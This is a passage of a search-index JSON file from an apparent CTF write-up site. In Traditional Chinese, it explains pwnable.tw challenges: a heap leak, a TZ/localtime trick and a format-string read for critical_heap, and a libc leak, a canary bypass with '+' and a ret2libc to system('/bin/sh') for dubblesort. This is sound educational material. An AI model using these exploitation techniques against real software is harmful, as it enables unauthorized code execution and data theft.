localtime \u5148\u4f7f\u7528 getenv \u6293\u53d6\u74b0\u5883\u8b8a\u6578 TZ \u7684\u503c\uff0c\u63a5\u8457\u8b80\u51fa TZ \u6240\u6307\u7684\u6a94\u6848\uff0c\u4e26\u5c07\u5167\u5bb9\u5b58\u5728 heap \u4e0a","title":"time"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#play_system","text":"","title":"play_system"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#set-the-name-for-the-heap","text":"\u9019\u500b\u529f\u80fd\u5176\u5be6\u5c31\u662f setenv","title":"Set the name for the heap"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#unset-the-name-in-the-heap","text":"\u9019\u500b\u529f\u80fd\u662f unsetenv","title":"Unset the name in the heap"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#get-the-value-of-name","text":"\u9019\u500b\u529f\u80fd\u6bd4\u8f03\u7279\u5225\uff0c\u6703\u5148\u7528 getenv \u6293\u8f38\u5165\u7684 name\uff0c\u63a5\u8457\u5c07\u6293\u5230\u7684\u6307\u6a19 (\u6307\u5411 heap \u4e0a\u5b58 value \u8655) \u5b58\u5728 rax + 0x20 (struct \u4e0a 0x20 \u7684\u4f4d\u7f6e)","title":"Get the value of name"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#play_normal","text":"","title":"play_normal"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#show-the-content-of-heap","text":"\u9019\u500b\u529f\u80fd\u6709 format string \u7684\u6f0f\u6d1e\uff0c\u800c\u4e14\u662f\u4f7f\u7528 printf_chk","title":"Show the content of heap"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#delete","text":"delete \u5be6\u969b\u4e0a\u53ea\u6709\u628a\u6307\u5b9a\u7684 struct \u6a19\u6210 0 \u800c\u5df2\uff0c\u4e0a\u9762\u7684\u8cc7\u8a0a\u4e26\u6c92\u6709\u6e05\u7a7a","title":"delete"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#conclusion","text":"create_normal \u8b80\u53d6 content \u6642\u6c92\u6709\u7d50\u5c3e play_normal \u6709 format string \u7684\u6f0f\u6d1e setenv \u53ef\u4ee5\u6539\u52d5 TZ \u7684\u503c delete \u6c92\u6709\u6e05\u7a7a","title":"Conclusion"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#solution","text":"\u89e3\u6cd5\u6b65\u9a5f\u5982\u4e0b\uff1a leak heap base \u4f4d\u7f6e \u5229\u7528 setenv \u6539\u52d5 TZ \u4ee5\u5f8c\uff0c\u7528 localtime \u5c07 flag \u8b80\u5230 heap \u4e0a \u5229\u7528 format string \u5370\u51fa flag","title":"Solution"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#leak-heap-base","text":"\u9019\u500b\u90e8\u5206\u8981\u5229\u7528 \"delete \u6c92\u6709\u6e05\u7a7a\" \u7684\u6f0f\u6d1e \u5148\u5275 system\uff0c\u63a5\u8457\u5230 play \u96a8\u4fbf\u5275\u4e00\u500b\u74b0\u5883\u8b8a\u6578\uff0c\u518d\u4f7f\u7528 play_system_get_value \u4f86\u5c07\u74b0\u5883\u8b8a\u6578\u7684\u4f4d\u5740\u653e\u5230 struct \u4e0a\uff0c\u9019\u662f\u70ba\u4e86\u53d6\u5f97\u4e00\u6bb5 heap address 0x000 name 0x020 value (heap address) \u63a5\u8457 delete \u6389\uff0c\u7136\u5f8c\u5275\u4e00\u500b normal \u7684 struct\uff0c\u6b64\u6642 normal struct \u6703\u84cb\u5728 system struct \u539f\u672c\u7684\u4f4d\u7f6e\u4e0a \u56e0\u70ba content \u5b58\u5728 0x18\uff0c\u8207\u539f\u672c\u7684 value \u5dee 0x8\uff0c\u8981\u8f38\u5165 8 \u500b\u5b57\u5143\u624d\u80fd\u78b0\u5230 value \u7684\u4f4d\u7f6e \u4e0d\u8981\u8f38\u5165 \\n \u4e0d\u7136\u8f38\u51fa\u6703\u88ab\u622a\u65b7 0x000 name 0x018 content ('AAAAAAAA') 0x020 value (heap address) \u6700\u5f8c\u5c31\u4f7f\u7528 show \u628a struct \u5370\u51fa\u4f86\u5c31\u53ef\u4ee5\u5f97\u5230 heap address \u4e86 \u56e0\u70ba\u5728 heap \u4e0a\u76f8\u5c0d\u4f4d\u7f6e\u4e0d\u8b8a\uff0c\u7528 gdb \u770b\u4e00\u4e0b\u8ddf base \u5dee\u591a\u9060\uff0cleak \u51fa\u4f86\u5f8c\u6e1b\u6389\u5c31\u662f heap base \u4e86","title":"leak heap base"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#tz","text":"\u9019\u500b\u90e8\u5206\u5c31\u5275\u4e00\u500b system \u7136\u5f8c\u7528 setenv \u628a TZ \u8a2d\u6210 /home/critical_heap++/flag \u63a5\u8457\u5275\u4e00\u500b time struct\uff0c\u5c31\u6703\u5728 localtime \u5c07 flag \u8b80\u53d6\u5230 heap \u4e0a\u4e86\uff0c\u7136\u5f8c\u7528 gdb \u770b\u4e00\u4e0b offset \u642d\u914d heap base \u5c31\u53ef\u4ee5\u77e5\u9053 flag address \u4e86","title":"TZ"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#format-string","text":"\u5229\u7528 format string \u642d\u914d %s \u53ef\u4ee5 leak \u4efb\u610f\u4f4d\u5740\u7684\u7279\u6027\u4f86 leak flag address \u53e6\u5916\uff0c\u56e0\u70ba\u662f\u4f7f\u7528 printf_chk \u7684\u95dc\u4fc2\uff0c\u4e0d\u80fd\u4f7f\u7528 $ \u8981\u81ea\u5df1\u7528 %c \u4f86\u8df3\u5230\u6307\u5b9a\u5340\u57df","title":"format string"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#note","text":"","title":"Note"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#peda-in-docker","text":"\u9019\u6b21\u6709\u7d66\u4e00\u500b docker \u7684\u74b0\u5883\uff0c\u8981\u5728\u88e1\u9762\u4f7f\u7528 gdb-peda \u7684\u8a71\uff0c\u8981\u6539\u52d5\u4ee5\u4e0b\u8a2d\u5b9a","title":"peda in docker"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#dockerfile","text":"RUN apt-get install gdb git -y WORKDIR /root RUN git clone https://github.com/scwuaptx/Pwngdb.git ; cp ~/Pwngdb/.gdbinit ~/ RUN git clone https://github.com/scwuaptx/peda.git ~/peda ; echo \"source ~/peda/peda.py\" >> ~/.gdbinit ; cp ~/peda/.inputrc ~/","title":"Dockerfile"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#docker-composeyml","text":"critical_heap : cap_add : - SYS_PTRACE","title":"docker-compose.yml"},{"location":"Writeups/Others/pwnable.tw/dubblesort/","text":"dubblesort Challenge link: dubblesort Category: pwn Writeup: dubblesort Sort the memory! nc chall.pwnable.tw 10101 dubblesort libc.so Observation \u4e00\u958b\u59cb\u7a0b\u5f0f\u5148\u554f\u4e86 \u540d\u5b57 \uff0c\u63a5\u8457\u554f\u8981 \u6392\u5217\u5e7e\u500b\u6578\u5b57 \uff0c\u6700\u5f8c\u4f9d\u5e8f\u8f38\u5165 \u5404\u500b\u6578\u5b57 \u5f8c\u6703\u6392\u5217\u5b8c\u8f38\u51fa\u7d50\u679c \u770b\u5230\u9019\u984c\u6642\uff0c\u6211\u60f3\u5230\u4e4b\u524d\u5728 csie.ctf.tw \u6709\u5beb\u904e\u4e00\u984c bubblesort \uff0c\u90a3\u984c\u662f\u900f\u904e\u6392\u5217\u7684\u6578\u5b57\u6c92\u6709\u9650\u5236\u6578\u91cf\u4f86\u84cb\u5230 return address\uff0c\u6216\u8a31\u9019\u984c\u6709\u985e\u4f3c\u7684\u6f0f\u6d1e $ ./dubblesort What your name :a Hello a ,How many numbers do you what to sort :3 Enter the 0 number : 0 Enter the 1 number : 1 Enter the 2 number : 2 Processing...... Result : 0 1 2 file $ file dubblesort dubblesort: ELF 32 -bit LSB shared object, Intel 80386 , version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped checksec \u4fdd\u8b77\u5168\u958b gdb-peda$ checksec CANARY : ENABLED FORTIFY : ENABLED NX : ENABLED PIE : ENABLED RELRO : FULL input \u540d\u5b57\u662f\u4f7f\u7528 read() \u4f86\u8b80\u53d6\uff0c\u8b80\u53d6\u7684\u9577\u5ea6\u662f 0x40 0x56555a11 <main+78>: mov DWORD PTR [ esp ] ,0x0 = > 0x56555a18 <main+85>: call 0x56555630 <read@plt> 0x56555a1d <main+90>: mov DWORD PTR [ esp+0x8 ] ,esi Guessed arguments: arg [ 0 ] : 0x0 arg [ 1 ] : 0xffffd72c --> 0xff17 arg [ 2 ] : 0x40 ( '@' ) \u8981\u6392\u5217\u7684\u6578\u91cf\u662f\u4f7f\u7528 scanf() \uff0c\u4e14\u53c3\u6578\u662f %u \u4e5f\u5c31\u662f unsigned int 0x56555a45 <main+130>: mov DWORD PTR [ esp ] ,eax = > 0x56555a48 <main+133>: call 0x56555700 <__isoc99_scanf@plt> 0x56555a4d <main+138>: mov eax,DWORD PTR [ esp+0x18 ] Guessed arguments: arg [ 0 ] : 0x56555bfa --> 0x45007525 ( '%u' ) arg [ 1 ] : 0xffffd708 --> 0xe0 \u63a5\u8457\u6578\u5b57\u7684\u90e8\u5206\u4e00\u6a23\u662f\u4f7f\u7528 scanf() \u52a0\u4e0a %u 0x56555a92 <main+207>: mov DWORD PTR [ esp ] ,eax = > 0x56555a95 <main+210>: call 0x56555700 <__isoc99_scanf@plt> 0x56555a9a <main+215>: add esi,0x1 Guessed arguments: arg [ 0 ] : 0x56555bfa --> 0x45007525 ( '%u' ) arg [ 1 ] : 0xffffd70c --> 0xf7f37f0a ( mov edx,DWORD PTR [ esp+0x18 ]) sort sort \u7684\u53c3\u6578\u662f \u8981\u6392\u5217\u7684\u6578\u91cf \u4ee5\u53ca \u7b2c\u4e00\u500b\u6578\u5b57\u5728 stack \u4e0a\u7684\u4f4d\u5740\uff0c\u6392\u5217\u7684\u65b9\u5f0f\u770b\u8d77\u4f86\u6c92\u4ec0\u9ebc\u554f\u984c 0x56555ab0 <main+237>: mov DWORD PTR [ esp ] ,eax = > 0x56555ab3 <main+240>: call 0x56555931 0x56555ab8 <main+245>: lea eax, [ ebx-0x138c ] Guessed arguments: arg [ 0 ] : 0xffffd70c --> 0x0 arg [ 1 ] : 0x3 ----------------------- stack ----------------------- 0028 | 0xffffd70c --> 0x0 # num 0 0032 | 0xffffd710 --> 0x1 # num 1 0036 | 0xffffd714 --> 0x2 # num 2 name \u5728\u6e2c\u8a66 name \u7684\u6642\u5019\uff0c\u767c\u73fe\u6709\u6642\u5019\u6703\u8f38\u51fa\u4e00\u4e9b\u4e0d\u53ef\u8996\u5b57\u5143 ./dubblesort What your name :aaaa Hello aaaa y\ufffd\ufffd/,How many numbers do you what to sort : \u7d93\u904e\u89c0\u5bdf\u5f8c\u767c\u73fe\u61c9\u8a72\u662f\u56e0\u70ba name \u6c92\u6709\u5c07\u6240\u6709\u7a7a\u9593\u5148\u6b78\u96f6\uff0c\u6240\u4ee5\u8f38\u51fa\u6642\u624d\u6703\u9023\u540c\u5f8c\u9762\u7684\u820a\u8cc7\u6599\u4e00\u8d77\u8f38\u51fa stack canary \u56e0\u70ba\u6709\u958b canary \u7684\u95dc\u4fc2\uff0c\u5c31\u7b97\u6c92\u6709\u6aa2\u67e5\u6700\u591a\u53ef\u4ee5\u8f38\u5165\u5e7e\u500b\u6578\u5b57\uff0c\u518d\u8f38\u5165\u8d85\u904e\u6642\u4f9d\u7136\u6703\u5674\u932f *** stack smashing detected ***: ./dubblesort terminated \u5229\u7528\u4e8c\u5206\u641c\u7684\u65b9\u5f0f\u6e2c\u8a66\uff0c\u767c\u73fe\u6700\u591a\u53ea\u80fd\u8f38\u5165\u5230 24 \u500b\u6578\u5b57\uff0c\u5982\u679c\u5230\u7b2c 25 \u500b\u6578\u5b57\u7684\u8a71\uff0c\u5728\u6392\u5217\u6642\u5c31\u6703\u5674\u51fa\u4ee5\u4e0a\u7684\u932f\u8aa4\u8a0a\u606f Solution \u7e3d\u5171\u6709\u4e09\u500b\u6b65\u9a5f\u8981\u505a leak libc bypass canary ret2libc Leak libc \u9019\u908a\u6211\u5229\u7528\u7684\u662f name \u56e0\u70ba name \u7684 buffer \u6c92\u6709\u5148\u6e05\u7a7a\u7684\u95dc\u4fc2\uff0c\u6240\u4ee5\u53ef\u4ee5 leak \u51fa\u5f8c\u9762\u7684\u6578\u503c 0060 | 0xffffd72c ( \"aaaa\\n\\331\\377\\377/\" ) 0064 | 0xffffd730 --> 0xffffd90a --> 0xfb6d2200 0068 | 0xffffd734 --> 0x2f ( '/' ) 0072 | 0xffffd738 --> 0x8e 0076 | 0xffffd73c --> 0x16 0080 | 0xffffd740 --> 0x8000 0084 | 0xffffd744 --> 0xf7fcb000 --> 0x1b1db0 0088 | 0xffffd748 --> 0xf7fc9244 --> 0xf7e31020 ( call 0xf7f38b59 ) < == \u7531\u4e0a\u9762 stack \u5167\u5bb9\u53ef\u77e5\uff0c\u7b2c 8 \u500b\u5305\u542b\u4e00\u500b\u4f4d\u5740\uff0c\u53ef\u4ee5\u8a18\u9304\u4e0b\u6b64\u6642 libc base \u8207\u5176\u4e4b\u9593\u7684\u5dee\u503c\uff0c\u4e26\u5728\u771f\u6b63 leak \u51fa\u6b64\u503c\u6642\u6e1b\u6389\u5dee\u503c\uff0c\u5373\u53ef\u5f97\u5230 libc base 0xf7fc9244 - libc_base = x ( \u56fa\u5b9a\u7684 ) leak_addr - x = libc_base \u53ea\u8981\u8f38\u5165 28 (4*7) \u500b\u5b57\u5143\u4f5c\u70ba payload \uff0c\u5c31\u53ef\u4ee5\u5370\u51fa\u9019\u500b\u4f4d\u5740\u7684\u503c\u4e86 0060 | 0xffffd72c ( 'a' <repeats 28 times>, \"\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0064 | 0xffffd730 ( 'a' <repeats 24 times>, \"\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0068 | 0xffffd734 ( 'a' <repeats 20 times>, \"\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0072 | 0xffffd738 ( 'a' <repeats 16 times>, \"\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0076 | 0xffffd73c ( 'a' <repeats 12 times>, \"\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0080 | 0xffffd740 ( \"aaaaaaaa\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0084 | 0xffffd744 ( \"aaaa\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0088 | 0xffffd748 --> 0xf7fc920a --> 0x0 bypass canary \u5728 observation \u6642\uff0c\u6709\u5229\u7528\u4e8c\u5206\u641c\u7684\u65b9\u5f0f\u627e\u5230 canary \u7684\u4f4d\u7f6e\u5728\u7b2c 25 \u500b \u6b64\u6642\u53ef\u4ee5\u5229\u7528\u8f38\u5165\u6642\u7684 scanf(\"%u\") \uff0c\u4e00\u822c\u5728\u8f38\u5165\u6642\uff0c\u8981\u8f38\u5165 unsigned int \u624d\u6703\u88ab\u63a5\u53d7\uff0c\u4f46\u662f\u9019\u6a23\u6703\u84cb\u6389 canary \uff0c\u7d93\u904e\u641c\u5c0b\u5f8c\u624d\u77e5\u9053\uff0c\u539f\u4f86\u53ef\u4ee5\u8f38\u5165 '+'\uff0c\u6b64\u6642\u6703\u88ab\u7576\u4f5c\u6b63\u5e38\u8f38\u5165\uff0c\u4f46\u4fdd\u7559\u6b64\u4f4d\u7f6e\u539f\u59cb\u7684\u503c\uff0c\u76f4\u63a5\u8df3\u5230\u4e0b\u4e00\u500b\uff0c\u5982\u6b64\u4e00\u4f86\u5c31\u53ef\u76f4\u63a5\u7e5e\u904e canary \u4e86 ret2libc \u8981\u505a\u5230 ret2libc \u7684\u8a71\u9054\u6210\u5169\u500b\u689d\u4ef6 libc base return address libc base \u5728\u5148\u524d\u5df2\u7d93\u900f\u904e name \u53d6\u5f97\u4e86\uff0c\u60f3\u8981\u63a7\u5236 return address \u7684\u8a71\uff0c\u53ef\u4ee5\u5229\u7528\u8f38\u5165\u6578\u5b57\u6642\u7684 buffer overflow\uff0c\u56e0\u70ba\u5df2\u7d93\u8df3\u904e canary \u4e86\uff0c\u6240\u4ee5\u53ef\u4ee5\u4e00\u76f4\u63a8\u5230 return \u7684\u4f4d\u7f6e\uff0c\u4e26\u9032\u800c\u63a7\u5236 return address \u9019\u908a\u6211\u4e00\u6a23\u7528\u4e8c\u5206\u641c\u7684\u65b9\u5f0f\u4f86\u505a\uff0c\u5982\u679c\u6709\u84cb\u5230 return address \u7684\u4f4d\u7f6e\u7684\u8a71\u6703\u51fa\u73fe\u4ee5\u4e0b\u8a0a\u606f [ * ] Process './dubblesort' stopped with exit code -11 ( SIGSEGV ) ( pid 2290 ) \u641c\u5c0b\u904e\u5f8c\u77e5\u9053 return address \u662f\u5728\u7b2c 33 \u500b\u4f4d\u7f6e 24 ( payload ) + canary + 7 + ret \u6700\u5f8c\u5c31\u662f\u4f7f\u7528 libc base \u627e\u5230 system \u4ee5\u53ca /bin/sh \u4e32\u63a5\u5728 return address \u7684\u4f4d\u7f6e\u5373\u53ef Note pwntool libc \u56e0\u70ba\u6709\u7d66 libc \uff0c\u6240\u4ee5\u5728\u672c\u6a5f\u6e2c\u8a66\u6642\u6700\u597d\u662f\u639b\u4e0a libc \uff0c\u5426\u5247\u4f4d\u5740\u53ef\u80fd\u6703\u8ddf\u9060\u7aef\u4e0d\u540c r = process ( './dubblesort' , env = { 'LD_PRELOAD' : './libc_32.so.6' }) sort \u5728\u8f38\u5165 payload \u6642\uff0c\u56e0\u70ba\u8f38\u5165\u5b8c\u5f8c\u9084\u6703\u9032\u884c\u6392\u5e8f\uff0c\u6240\u4ee5\u8981\u78ba\u4fdd\u6392\u5e8f\u904e\u5f8c\u9806\u5e8f\u4f9d\u7136\u4e0d\u8b8a \u6211\u7684\u4f5c\u6cd5\u662f\u524d 24 \u500b\u5b57\u5c31\u76f4\u63a5\u8f38\u5165 0~23 \uff0ccanary \u7684\u90e8\u5206\u8f38\u5165 + (43)\uff0c\u63a5\u8457\u5f8c\u9762\u7684 7 \u500b\u5b57\u653e libc base\uff0c\u6700\u5f8c system \u53ca /bin/sh \u56e0\u70ba\u8981\u52a0\u4e0a libc base \uff0c\u6240\u4ee5\u4e00\u5b9a\u6bd4 libc base \u5927 system \u5728\u547c\u53eb system \u6642\uff0cstack \u7b2c\u4e00\u500b\u4f4d\u7f6e\u662f\u7d50\u675f\u5f8c\u7684 return address\uff0c\u56e0\u70ba\u4e0d\u6703 return \u4e86\uff0c\u6240\u4ee5\u96a8\u4fbf\u586b\u5c31\u53ef\u4ee5\u4e86\uff0c\u63a5\u8457\u624d\u662f system \u7684\u7b2c\u4e00\u500b\u53c3\u6578 /bin/sh","title":"dubblesort"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#dubblesort","text":"Challenge link: dubblesort Category: pwn Writeup: dubblesort Sort the memory! nc chall.pwnable.tw 10101 dubblesort libc.so","title":"dubblesort"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#observation","text":"\u4e00\u958b\u59cb\u7a0b\u5f0f\u5148\u554f\u4e86 \u540d\u5b57 \uff0c\u63a5\u8457\u554f\u8981 \u6392\u5217\u5e7e\u500b\u6578\u5b57 \uff0c\u6700\u5f8c\u4f9d\u5e8f\u8f38\u5165 \u5404\u500b\u6578\u5b57 \u5f8c\u6703\u6392\u5217\u5b8c\u8f38\u51fa\u7d50\u679c \u770b\u5230\u9019\u984c\u6642\uff0c\u6211\u60f3\u5230\u4e4b\u524d\u5728 csie.ctf.tw \u6709\u5beb\u904e\u4e00\u984c bubblesort \uff0c\u90a3\u984c\u662f\u900f\u904e\u6392\u5217\u7684\u6578\u5b57\u6c92\u6709\u9650\u5236\u6578\u91cf\u4f86\u84cb\u5230 return address\uff0c\u6216\u8a31\u9019\u984c\u6709\u985e\u4f3c\u7684\u6f0f\u6d1e $ ./dubblesort What your name :a Hello a ,How many numbers do you what to sort :3 Enter the 0 number : 0 Enter the 1 number : 1 Enter the 2 number : 2 Processing...... Result : 0 1 2","title":"Observation"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#file","text":"$ file dubblesort dubblesort: ELF 32 -bit LSB shared object, Intel 80386 , version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped","title":"file"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#checksec","text":"\u4fdd\u8b77\u5168\u958b gdb-peda$ checksec CANARY : ENABLED FORTIFY : ENABLED NX : ENABLED PIE : ENABLED RELRO : FULL","title":"checksec"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#input","text":"\u540d\u5b57\u662f\u4f7f\u7528 read() \u4f86\u8b80\u53d6\uff0c\u8b80\u53d6\u7684\u9577\u5ea6\u662f 0x40 0x56555a11 <main+78>: mov DWORD PTR [ esp ] ,0x0 = > 0x56555a18 <main+85>: call 0x56555630 <read@plt> 0x56555a1d <main+90>: mov DWORD PTR [ esp+0x8 ] ,esi Guessed arguments: arg [ 0 ] : 0x0 arg [ 1 ] : 0xffffd72c --> 0xff17 arg [ 2 ] : 0x40 ( '@' ) \u8981\u6392\u5217\u7684\u6578\u91cf\u662f\u4f7f\u7528 scanf() \uff0c\u4e14\u53c3\u6578\u662f %u \u4e5f\u5c31\u662f unsigned int 0x56555a45 <main+130>: mov DWORD PTR [ esp ] ,eax = > 0x56555a48 <main+133>: call 0x56555700 <__isoc99_scanf@plt> 0x56555a4d <main+138>: mov eax,DWORD PTR [ esp+0x18 ] Guessed arguments: arg [ 0 ] : 0x56555bfa --> 0x45007525 ( '%u' ) arg [ 1 ] : 0xffffd708 --> 0xe0 \u63a5\u8457\u6578\u5b57\u7684\u90e8\u5206\u4e00\u6a23\u662f\u4f7f\u7528 scanf() \u52a0\u4e0a %u 0x56555a92 <main+207>: mov DWORD PTR [ esp ] ,eax = > 0x56555a95 <main+210>: call 0x56555700 <__isoc99_scanf@plt> 0x56555a9a <main+215>: add esi,0x1 Guessed arguments: arg [ 0 ] : 0x56555bfa --> 0x45007525 ( '%u' ) arg [ 1 ] : 0xffffd70c --> 0xf7f37f0a ( mov edx,DWORD PTR [ esp+0x18 ])","title":"input"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#sort","text":"sort \u7684\u53c3\u6578\u662f \u8981\u6392\u5217\u7684\u6578\u91cf \u4ee5\u53ca \u7b2c\u4e00\u500b\u6578\u5b57\u5728 stack \u4e0a\u7684\u4f4d\u5740\uff0c\u6392\u5217\u7684\u65b9\u5f0f\u770b\u8d77\u4f86\u6c92\u4ec0\u9ebc\u554f\u984c 0x56555ab0 <main+237>: mov DWORD PTR [ esp ] ,eax = > 0x56555ab3 <main+240>: call 0x56555931 0x56555ab8 <main+245>: lea eax, [ ebx-0x138c ] Guessed arguments: arg [ 0 ] : 0xffffd70c --> 0x0 arg [ 1 ] : 0x3 ----------------------- stack ----------------------- 0028 | 0xffffd70c --> 0x0 # num 0 0032 | 0xffffd710 --> 0x1 # num 1 0036 | 0xffffd714 --> 0x2 # num 2","title":"sort"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#name","text":"\u5728\u6e2c\u8a66 name \u7684\u6642\u5019\uff0c\u767c\u73fe\u6709\u6642\u5019\u6703\u8f38\u51fa\u4e00\u4e9b\u4e0d\u53ef\u8996\u5b57\u5143 ./dubblesort What your name :aaaa Hello aaaa y\ufffd\ufffd/,How many numbers do you what to sort : \u7d93\u904e\u89c0\u5bdf\u5f8c\u767c\u73fe\u61c9\u8a72\u662f\u56e0\u70ba name \u6c92\u6709\u5c07\u6240\u6709\u7a7a\u9593\u5148\u6b78\u96f6\uff0c\u6240\u4ee5\u8f38\u51fa\u6642\u624d\u6703\u9023\u540c\u5f8c\u9762\u7684\u820a\u8cc7\u6599\u4e00\u8d77\u8f38\u51fa","title":"name"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#stack-canary","text":"\u56e0\u70ba\u6709\u958b canary \u7684\u95dc\u4fc2\uff0c\u5c31\u7b97\u6c92\u6709\u6aa2\u67e5\u6700\u591a\u53ef\u4ee5\u8f38\u5165\u5e7e\u500b\u6578\u5b57\uff0c\u518d\u8f38\u5165\u8d85\u904e\u6642\u4f9d\u7136\u6703\u5674\u932f *** stack smashing detected ***: ./dubblesort terminated \u5229\u7528\u4e8c\u5206\u641c\u7684\u65b9\u5f0f\u6e2c\u8a66\uff0c\u767c\u73fe\u6700\u591a\u53ea\u80fd\u8f38\u5165\u5230 24 \u500b\u6578\u5b57\uff0c\u5982\u679c\u5230\u7b2c 25 \u500b\u6578\u5b57\u7684\u8a71\uff0c\u5728\u6392\u5217\u6642\u5c31\u6703\u5674\u51fa\u4ee5\u4e0a\u7684\u932f\u8aa4\u8a0a\u606f","title":"stack canary"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#solution","text":"\u7e3d\u5171\u6709\u4e09\u500b\u6b65\u9a5f\u8981\u505a leak libc bypass canary ret2libc","title":"Solution"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#leak-libc","text":"\u9019\u908a\u6211\u5229\u7528\u7684\u662f name \u56e0\u70ba name \u7684 buffer \u6c92\u6709\u5148\u6e05\u7a7a\u7684\u95dc\u4fc2\uff0c\u6240\u4ee5\u53ef\u4ee5 leak \u51fa\u5f8c\u9762\u7684\u6578\u503c 0060 | 0xffffd72c ( \"aaaa\\n\\331\\377\\377/\" ) 0064 | 0xffffd730 --> 0xffffd90a --> 0xfb6d2200 0068 | 0xffffd734 --> 0x2f ( '/' ) 0072 | 0xffffd738 --> 0x8e 0076 | 0xffffd73c --> 0x16 0080 | 0xffffd740 --> 0x8000 0084 | 0xffffd744 --> 0xf7fcb000 --> 0x1b1db0 0088 | 0xffffd748 --> 0xf7fc9244 --> 0xf7e31020 ( call 0xf7f38b59 ) < == \u7531\u4e0a\u9762 stack \u5167\u5bb9\u53ef\u77e5\uff0c\u7b2c 8 \u500b\u5305\u542b\u4e00\u500b\u4f4d\u5740\uff0c\u53ef\u4ee5\u8a18\u9304\u4e0b\u6b64\u6642 libc base \u8207\u5176\u4e4b\u9593\u7684\u5dee\u503c\uff0c\u4e26\u5728\u771f\u6b63 leak \u51fa\u6b64\u503c\u6642\u6e1b\u6389\u5dee\u503c\uff0c\u5373\u53ef\u5f97\u5230 libc base 0xf7fc9244 - libc_base = x ( \u56fa\u5b9a\u7684 ) leak_addr - x = libc_base \u53ea\u8981\u8f38\u5165 28 (4*7) \u500b\u5b57\u5143\u4f5c\u70ba payload \uff0c\u5c31\u53ef\u4ee5\u5370\u51fa\u9019\u500b\u4f4d\u5740\u7684\u503c\u4e86 0060 | 0xffffd72c ( 'a' <repeats 28 times>, \"\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0064 | 0xffffd730 ( 'a' <repeats 24 times>, \"\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0068 | 0xffffd734 ( 'a' <repeats 20 times>, \"\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0072 | 0xffffd738 ( 'a' <repeats 16 times>, \"\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0076 | 0xffffd73c ( 'a' <repeats 12 times>, \"\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0080 | 0xffffd740 ( \"aaaaaaaa\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0084 | 0xffffd744 ( \"aaaa\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\" ) 0088 | 0xffffd748 --> 0xf7fc920a --> 0x0","title":"Leak libc"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#bypass-canary","text":"\u5728 observation \u6642\uff0c\u6709\u5229\u7528\u4e8c\u5206\u641c\u7684\u65b9\u5f0f\u627e\u5230 canary \u7684\u4f4d\u7f6e\u5728\u7b2c 25 \u500b \u6b64\u6642\u53ef\u4ee5\u5229\u7528\u8f38\u5165\u6642\u7684 scanf(\"%u\") \uff0c\u4e00\u822c\u5728\u8f38\u5165\u6642\uff0c\u8981\u8f38\u5165 unsigned int \u624d\u6703\u88ab\u63a5\u53d7\uff0c\u4f46\u662f\u9019\u6a23\u6703\u84cb\u6389 canary \uff0c\u7d93\u904e\u641c\u5c0b\u5f8c\u624d\u77e5\u9053\uff0c\u539f\u4f86\u53ef\u4ee5\u8f38\u5165 '+'\uff0c\u6b64\u6642\u6703\u88ab\u7576\u4f5c\u6b63\u5e38\u8f38\u5165\uff0c\u4f46\u4fdd\u7559\u6b64\u4f4d\u7f6e\u539f\u59cb\u7684\u503c\uff0c\u76f4\u63a5\u8df3\u5230\u4e0b\u4e00\u500b\uff0c\u5982\u6b64\u4e00\u4f86\u5c31\u53ef\u76f4\u63a5\u7e5e\u904e canary \u4e86","title":"bypass canary"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#ret2libc","text":"\u8981\u505a\u5230 ret2libc \u7684\u8a71\u9054\u6210\u5169\u500b\u689d\u4ef6 libc base return address libc base \u5728\u5148\u524d\u5df2\u7d93\u900f\u904e name \u53d6\u5f97\u4e86\uff0c\u60f3\u8981\u63a7\u5236 return address \u7684\u8a71\uff0c\u53ef\u4ee5\u5229\u7528\u8f38\u5165\u6578\u5b57\u6642\u7684 buffer 